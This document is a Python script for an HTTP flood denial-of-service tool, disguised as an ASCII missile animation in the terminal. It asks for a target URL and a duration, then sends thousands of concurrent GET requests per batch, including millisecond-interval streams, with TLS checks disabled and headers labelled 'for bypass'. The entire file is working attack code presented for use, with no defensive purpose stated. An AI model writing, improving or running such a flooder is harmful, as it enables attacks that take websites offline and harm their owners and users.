import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2

# Clear terminal
def clear():
    print("\033[H\033[J", end="")

# Generate random real-looking IPv4
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Countdown loader with random IPs
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        for _ in range(5):
            print(random_ip())
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

# Missile types: speed -> request batch
MISSILE_BATCHES = {
    1: 50,
    2: 200,
    3: 300,
    4: 1000,
    5: 50  # 50/ms missile
}

ULTRA_SUPER_BATCH = 3500
LAST_BATCH = 500
SUPERNOVA_INITIAL = 1000
SUPERNOVA_STREAM = 50 * 10  # 500/ms

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            self.speed = random.choice([1, 2, 3, 4, 5])  # Added type 5
        self.batch = MISSILE_BATCHES.get(self.speed, 50)
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(1, 3)
        self.exhaust = random.choice(EXHAUST_FRAMES)
        self.requests_sent = 0

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles with only number of requests
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        if missile.speed == 5:
                            buffer[pos] += " " * missile.x + line + f"  [{missile.batch}/ms]"
                        else:
                            buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# Minimal headers for bypass
def get_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }

# Send batch requests with minimal headers and no proxies
async def send_requests(target, batch):
    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=get_headers()) as session:
        tasks = []
        for _ in range(batch):
            try:
                task = session.get(target, allow_redirects=True, ssl=False)
                tasks.append(task)
            except:
                pass
        
        try:
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            successful = sum(1 for r in responses if not isinstance(r, Exception))
            return successful
        except Exception as e:
            return 0

# Special function for type 5 missile (50/ms)
async def send_continuous_requests(target, missile):
    missile.requests_sent = 0
    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.05  # Convert to real time
    
    start_time = time.time()
    requests_per_batch = 50  # 50 requests per batch
    batch_interval = 0.001  # 1 millisecond
    
    while time.time() - start_time < flight_time and missile.active:
        batch_start = time.time()
        successful = await send_requests(target, requests_per_batch)
        missile.requests_sent += successful
        
        # Maintain precise timing
        batch_duration = time.time() - batch_start
        sleep_time = max(0, batch_interval - batch_duration)
        await asyncio.sleep(sleep_time)

# Ultra-super missile every 5s
async def ultra_super_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH))
        await asyncio.sleep(5)

# Last missile every 0.5s
async def last_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests(target, LAST_BATCH))
        await asyncio.sleep(0.5)

# Supernova missile
async def supernova_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        delay = random.uniform(5, 10)
        await asyncio.sleep(delay)

        # Initial 1000 requests
        asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL))

        # Stream of 500/ms while rising (~2s flight)
        async def stream():
            t_end = time.time() + 2
            while time.time() < t_end:
                asyncio.create_task(send_requests(target, SUPERNOVA_STREAM))
                await asyncio.sleep(0.001)
        asyncio.create_task(stream())

# Main loop
async def main():
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    missiles = [Missile() for _ in range(3)]  # Increased to 3 missiles for more activity

    # Start heavy missiles
    asyncio.create_task(ultra_super_missile(target, duration))
    asyncio.create_task(last_missile(target, duration))
    asyncio.create_task(supernova_missile(target, duration))

    start_time = time.time()
    last_launch_times = [0] * len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                
                if missile.speed == 5:
                    # Type 5 missile: continuous 50/ms requests
                    asyncio.create_task(send_continuous_requests(target, missile))
                else:
                    # Normal missile: single batch
                    asyncio.create_task(send_requests(target, missile.batch))
            
            missile.move()
        
        draw_missiles(missiles)
        await asyncio.sleep(0.05)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
